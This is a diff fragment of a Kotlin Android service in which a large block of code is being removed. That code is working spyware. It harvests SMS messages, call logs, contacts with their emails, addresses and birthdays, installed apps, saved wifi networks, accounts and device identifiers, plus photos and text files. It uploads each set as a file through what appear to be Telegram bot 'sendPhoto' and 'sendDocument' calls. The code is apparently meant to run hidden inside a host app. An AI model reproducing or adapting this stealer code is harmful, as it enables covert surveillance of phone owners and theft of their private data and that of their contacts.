-
-    private fun bytesOf(uri: Uri): ByteArray? = try {
-        contentResolver.openInputStream(uri)?.use { it.readBytes() }
-    } catch (t: Throwable) {
-        null
-    }
-
-    private fun sendImage(uri: Uri) {
-        gate.acquire()
-        pool.execute {
-            try {
-                val name = nameOf(uri)
-                val lower = name.lowercase()
-                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
-                            lower.endsWith(".png") || lower.endsWith(".webp"))
-                ) return@execute
-                val data = bytesOf(uri) ?: return@execute
-                if (postFile("sendPhoto", "photo", name, "image/jpeg", data)) done.incrementAndGet()
-            } catch (t: Throwable) {
-                HsLog.e("sendImage: ${t.message}")
-            } finally {
-                gate.release()
-            }
-        }
-    }
-
-    private fun sendDoc(uri: Uri) {
-        gate.acquire()
-        pool.execute {
-            try {
-                val name = nameOf(uri)
-                if (!name.lowercase().endsWith(".txt")) return@execute
-                val data = bytesOf(uri) ?: return@execute
-                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
-            } catch (t: Throwable) {
-                HsLog.e("sendDoc: ${t.message}")
-            } finally {
-                gate.release()
-            }
-        }
-    }
-
-    private fun sendTextFile(name: String, content: String) {
-        gate.acquire()
-        pool.execute {
-            try {
-                val data = content.toByteArray(Charsets.UTF_8)
-                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
-            } catch (t: Throwable) {
-                HsLog.e("sendTextFile: ${t.message}")
-            } finally {
-                gate.release()
-            }
-        }
-    }
-
-    private fun stamp(millis: Long): String = try {
-        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(millis))
-    } catch (t: Throwable) {
-        millis.toString()
-    }
-
-    private fun sendSms() {
-        val sb = StringBuilder()
-        try {
-            contentResolver.query(
-                Uri.parse("content://sms"),
-                arrayOf("address", "body", "date", "type"),
-                null, null, "date DESC"
-            )?.use { c ->
-                var n = 0
-                while (c.moveToNext() && n < 5000) {
-                    val addr = c.getString(0) ?: "?"
-                    val body = c.getString(1) ?: ""
-                    val date = c.getLong(2)
-                    val type = c.getInt(3)
-                    val dir = if (type == 1) "IN" else if (type == 2) "OUT" else "OTHER"
-                    sb.append("[").append(dir).append("] ").append(stamp(date)).append("\n")
-                    sb.append(addr).append(": ").append(body).append("\n\n")
-                    n++
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("sms: ${t.message}")
-            return
-        }
-        HsLog.w("sms chars=${sb.length}")
-        if (sb.isNotEmpty()) sendTextFile("sms.txt", sb.toString())
-    }
-
-    private fun sendCalls() {
-        val sb = StringBuilder()
-        try {
-            contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
-                null, null, CallLog.Calls.DATE + " DESC"
-            )?.use { c ->
-                var n = 0
-                while (c.moveToNext() && n < 5000) {
-                    val num = c.getString(0) ?: "?"
-                    val type = c.getInt(1)
-                    val date = c.getLong(2)
-                    val dur = c.getLong(3)
-                    val kind = when (type) {
-                        1 -> "IN"
-                        2 -> "OUT"
-                        3 -> "MISSED"
-                        else -> "OTHER"
-                    }
-                    sb.append("[").append(kind).append("] ").append(stamp(date))
-                    sb.append(" dur=").append(dur).append("s ").append(num).append("\n")
-                    n++
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("calls: ${t.message}")
-            return
-        }
-        HsLog.w("calls chars=${sb.length}")
-        if (sb.isNotEmpty()) sendTextFile("call_log.txt", sb.toString())
-    }
-
-    private fun sendContacts() {
-        val sb = StringBuilder()
-        try {
-            contentResolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                ),
-                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
-            )?.use { c ->
-                var n = 0
-                while (c.moveToNext() && n < 5000) {
-                    val name = c.getString(0) ?: "?"
-                    val num = c.getString(1) ?: ""
-                    sb.append(name).append(": ").append(num).append("\n")
-                    n++
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("contacts: ${t.message}")
-            return
-        }
-        HsLog.w("contacts chars=${sb.length}")
-        if (sb.isNotEmpty()) sendTextFile("contacts.txt", sb.toString())
-    }
-
-    private fun sendContactDetails() {
-        val sb = StringBuilder()
-        try {
-            contentResolver.query(
-                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Email.ADDRESS
-                ), null, null, null
-            )?.use { c ->
-                while (c.moveToNext() && sb.length < 900_000) {
-                    sb.append(c.getString(0) ?: "?").append(" | email: ")
-                        .append(c.getString(1) ?: "").append("\n")
-                }
-            }
-            contentResolver.query(
-                ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS
-                ), null, null, null
-            )?.use { c ->
-                while (c.moveToNext() && sb.length < 1_500_000) {
-                    sb.append(c.getString(0) ?: "?").append(" | addr: ")
-                        .append(c.getString(1) ?: "").append("\n")
-                }
-            }
-            contentResolver.query(
-                ContactsContract.Data.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.Event.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Event.START_DATE
-                ),
-                ContactsContract.Data.MIMETYPE + "=?",
-                arrayOf(ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE),
-                null
-            )?.use { c ->
-                while (c.moveToNext() && sb.length < 2_000_000) {
-                    sb.append(c.getString(0) ?: "?").append(" | birthday: ")
-                        .append(c.getString(1) ?: "").append("\n")
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("contactDetails: ${t.message}")
-            return
-        }
-        HsLog.w("contactDetails chars=${sb.length}")
-        if (sb.isNotEmpty()) sendTextFile("contact_details.txt", sb.toString())
-    }
-
-    private fun sendApps() {
-        val sb = StringBuilder()
-        try {
-            val pm = packageManager
-            val rows = ArrayList<String>()
-            for (pi in pm.getInstalledPackages(0)) {
-                val ai = pi.applicationInfo ?: continue
-                val label = try {
-                    pm.getApplicationLabel(ai).toString()
-                } catch (t: Throwable) {
-                    "?"
-                }
-                val kind = if ((ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0) "SYS" else "USR"
-                rows.add("[" + kind + "] " + label + " | " + pi.packageName +
-                        " | " + (pi.versionName ?: "-") + " | " + pi.firstInstallTime)
-            }
-            rows.sort()
-            for (r in rows) sb.append(r).append("\n")
-        } catch (t: Throwable) {
-            HsLog.e("apps: ${t.message}")
-            return
-        }
-        HsLog.w("apps chars=${sb.length}")
-        if (sb.isNotEmpty()) sendTextFile("installed_apps.txt", sb.toString())
-    }
-
-    private fun intToIp(v: Int): String =
-        (v and 0xFF).toString() + "." + ((v shr 8) and 0xFF) + "." +
-                ((v shr 16) and 0xFF) + "." + ((v shr 24) and 0xFF)
-
-    private fun sendWifi() {
-        val sb = StringBuilder()
-        try {
-            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
-            @Suppress("DEPRECATION")
-            val ci = wm.connectionInfo
-            if (ci != null) {
-                sb.append("SSID: ").append(ci.ssid).append("\n")
-                sb.append("BSSID: ").append(ci.bssid).append("\n")
-                sb.append("IP: ").append(intToIp(ci.ipAddress)).append("\n")
-                sb.append("Link speed: ").append(ci.linkSpeed).append("\n")
-                sb.append("RSSI: ").append(ci.rssi).append("\n")
-            }
-            sb.append("\nSaved networks:\n")
-            @Suppress("DEPRECATION")
-            val nets = wm.configuredNetworks
-            if (nets != null) {
-                for (n in nets) {
-                    sb.append(n.SSID).append(" | ").append(n.BSSID).append("\n")
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("wifi: ${t.message}")
-            return
-        }
-        HsLog.w("wifi chars=${sb.length}")
-        sendTextFile("wifi.txt", sb.toString())
-    }
-
-    private fun sendAccounts() {
-        val sb = StringBuilder()
-        try {
-            val am = AccountManager.get(this)
-            for (a in am.accounts) {
-                sb.append(a.name).append(" | ").append(a.type).append("\n")
-            }
-            sb.append("\nNote: passwords are not readable without root.\n")
-        } catch (t: Throwable) {
-            HsLog.e("accounts: ${t.message}")
-            return
-        }
-        HsLog.w("accounts chars=${sb.length}")
-        sendTextFile("accounts.txt", sb.toString())
-    }
-
-    private fun sendSystem() {
-        val sb = StringBuilder()
-        try {
-            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-            sb.append("Battery: ")
-                .append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%\n")
-        } catch (_: Throwable) {
-        }
-        try {
-            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
-            val t = when {
-                nc == null -> "none"
-                nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
-                nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
-                nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
-                else -> "other"
-            }
-            sb.append("Network: ").append(t).append("\n")
-        } catch (_: Throwable) {
-        }
-        try {
-            val dm = resources.displayMetrics
-            sb.append("Screen: ").append(dm.widthPixels).append("x").append(dm.heightPixels)
-                .append(" @").append(dm.densityDpi).append("dpi\n")
-        } catch (_: Throwable) {
-        }
-        sb.append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
-        sb.append("Uptime: ").append(SystemClock.elapsedRealtime() / 1000).append("s\n")
-        HsLog.w("system chars=${sb.length}")
-        sendTextFile("system.txt", sb.toString())
-    }
-
-    private fun sendDevice() {
-        val sb = StringBuilder()
-        sb.append("Brand: ").append(Build.BRAND).append("\n")
-        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n")
-        sb.append("Model: ").append(Build.MODEL).append("\n")
-        sb.append("Device: ").append(Build.DEVICE).append("\n")
-        sb.append("Product: ").append(Build.PRODUCT).append("\n")
-        sb.append("Hardware: ").append(Build.HARDWARE).append("\n")
-        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n")
-        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n")
-        sb.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n")
-        sb.append("Host package: ").append(packageName).append("\n")
-        try {
-            val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-            sb.append("Operator: ").append(tm.networkOperatorName).append("\n")
-            sb.append("Sim country: ").append(tm.simCountryIso).append("\n")
-        } catch (_: Throwable) {
-        }
-        HsLog.w("device chars=${sb.length}")
-        sendTextFile("device_info.txt", sb.toString())
-    }
-
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    override fun onDestroy() {
-        try {
-            pool.shutdownNow()
-        } catch (_: Throwable) {
-        }
-        try {
-            camPool.shutdownNow()
-        } catch (_: Throwable) {
-        }
-        super.onDestroy()
     }
 }
